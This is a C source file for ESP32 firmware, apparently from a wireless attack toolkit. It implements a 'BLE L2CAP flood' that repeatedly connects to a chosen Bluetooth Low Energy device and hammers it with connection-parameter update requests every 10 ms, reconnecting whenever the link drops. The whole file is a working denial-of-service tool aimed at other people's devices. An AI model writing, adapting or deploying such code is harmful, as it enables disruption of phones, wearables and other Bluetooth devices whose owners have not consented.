// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "ble_l2cap_flood.h"
#include "bluetooth_service.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "host/ble_gap.h"
#include <string.h>

static const char *TAG = "L2CAP_FLOOD";

static bool is_running = false;
static uint8_t target_addr[6];
static uint8_t target_addr_type;
static uint16_t conn_handle = BLE_HS_CONN_HANDLE_NONE;

static TaskHandle_t l2cap_task_handle = NULL;
static StackType_t *l2cap_task_stack = NULL;
static StaticTask_t *l2cap_task_tcb = NULL;
#define L2CAP_STACK_SIZE 4096

static SemaphoreHandle_t l2cap_sem = NULL;

static int l2cap_gap_event(struct ble_gap_event *event, void *arg) {
  switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
      if (event->connect.status == 0) {
        ESP_LOGI(TAG, "Connected to target. Starting L2CAP flood...");
        conn_handle = event->connect.conn_handle;
        if (l2cap_sem) xSemaphoreGive(l2cap_sem);
      } else {
        ESP_LOGW(TAG, "Connection failed status=%d", event->connect.status);
        conn_handle = BLE_HS_CONN_HANDLE_NONE;
        if (l2cap_sem) xSemaphoreGive(l2cap_sem); 
      }
      break;

    case BLE_GAP_EVENT_DISCONNECT:
      ESP_LOGI(TAG, "Disconnected.");
      conn_handle = BLE_HS_CONN_HANDLE_NONE;
      if (l2cap_sem) xSemaphoreGive(l2cap_sem);
      break;

    case BLE_GAP_EVENT_CONN_UPDATE:
      // Ignore update events
      break;

    case BLE_GAP_EVENT_CONN_UPDATE_REQ:
      // Accept any update to keep connection alive if they ask
      return 0;

    default:
      break;
  }
  return 0;
}

static void l2cap_task(void *pvParameters) {
  ESP_LOGI(TAG, "L2CAP Flood Task Started");

  struct ble_gap_conn_params conn_params = {0};
  conn_params.scan_itvl = 0x0010;
  conn_params.scan_window = 0x0010;
  conn_params.itvl_min = BLE_GAP_INITIAL_CONN_ITVL_MIN;
  conn_params.itvl_max = BLE_GAP_INITIAL_CONN_ITVL_MAX;
  conn_params.latency = 0;
  conn_params.supervision_timeout = 0x0100;
  conn_params.min_ce_len = 0x0010;
  conn_params.max_ce_len = 0x0300;

  ble_addr_t addr;
  memcpy(addr.val, target_addr, 6);
  addr.type = target_addr_type;

  while (is_running) {
    if (conn_handle == BLE_HS_CONN_HANDLE_NONE) {
      bluetooth_service_stop_advertising();

      xSemaphoreTake(l2cap_sem, 0);

      ESP_LOGD(TAG, "Connecting...");
      int rc = ble_gap_connect(bluetooth_service_get_own_addr_type(), &addr, 10000, &conn_params, l2cap_gap_event, NULL);

      if (rc == 0) {
        xSemaphoreTake(l2cap_sem, portMAX_DELAY);
      } else if (rc == BLE_HS_EALREADY) {
        vTaskDelay(pdMS_TO_TICKS(100));
      } else {
        ESP_LOGE(TAG, "Connect failed: %d", rc);
        vTaskDelay(pdMS_TO_TICKS(1000));
      }
    } else {
      struct ble_gap_upd_params params;
      params.itvl_min = 6;  // 7.5ms
      params.itvl_max = 3200; // 4000ms
      params.latency = 0;
      params.supervision_timeout = 500; // 5s
      params.min_ce_len = 0;
      params.max_ce_len = 0;

      int rc = ble_gap_update_params(conn_handle, &params);

      if (rc == 0) {
      } else if (rc == BLE_HS_ENOTCONN) {
        conn_handle = BLE_HS_CONN_HANDLE_NONE;
      } else {
        // EBUSY or other, just wait a tiny bit
        // vTaskDelay(1); 
      }

      vTaskDelay(pdMS_TO_TICKS(10)); 
    }
  }

  if (conn_handle != BLE_HS_CONN_HANDLE_NONE) {
    ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    conn_handle = BLE_HS_CONN_HANDLE_NONE;
  }

  l2cap_task_handle = NULL;
  vTaskDelete(NULL);
}

esp_err_t ble_l2cap_flood_start(const uint8_t *addr, uint8_t addr_type) {
  if (is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service not running");
    return ESP_FAIL;
  }

  memcpy(target_addr, addr, 6);
  target_addr_type = addr_type;

  if (l2cap_sem == NULL) {
    l2cap_sem = xSemaphoreCreateBinary();
  }

  conn_handle = BLE_HS_CONN_HANDLE_NONE;

  l2cap_task_stack = (StackType_t *)heap_caps_malloc(L2CAP_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  l2cap_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_SPIRAM);

  if (!l2cap_task_stack || !l2cap_task_tcb) {
    ESP_LOGE(TAG, "Failed to allocate memory for l2cap task");
    if (l2cap_task_stack) heap_caps_free(l2cap_task_stack);
    if (l2cap_task_tcb) heap_caps_free(l2cap_task_tcb);
    return ESP_ERR_NO_MEM;
  }

  is_running = true;
  l2cap_task_handle = xTaskCreateStatic(
    l2cap_task,
    "ble_l2cap_task",
    L2CAP_STACK_SIZE,
    NULL,
    5,
    l2cap_task_stack,
    l2cap_task_tcb
  );

  if (l2cap_task_handle == NULL) {
    is_running = false;
    return ESP_FAIL;
  }

  return ESP_OK;
}

esp_err_t ble_l2cap_flood_stop(void) {
  if (!is_running) return ESP_OK;

  is_running = false;

  if (l2cap_sem) {
    xSemaphoreGive(l2cap_sem);
  }

  int retry = 20;
  while (l2cap_task_handle != NULL && retry > 0) {
    vTaskDelay(pdMS_TO_TICKS(50));
    retry--;
  }

  if (l2cap_task_stack) { heap_caps_free(l2cap_task_stack); l2cap_task_stack = NULL; }
  if (l2cap_task_tcb) { heap_caps_free(l2cap_task_tcb); l2cap_task_tcb = NULL; }

  if (l2cap_sem) {
    vSemaphoreDelete(l2cap_sem);
    l2cap_sem = NULL;
  }

  ESP_LOGI(TAG, "L2CAP Flood stopped");
  return ESP_OK;
}

bool ble_l2cap_flood_is_running(void) {
  return is_running;
}
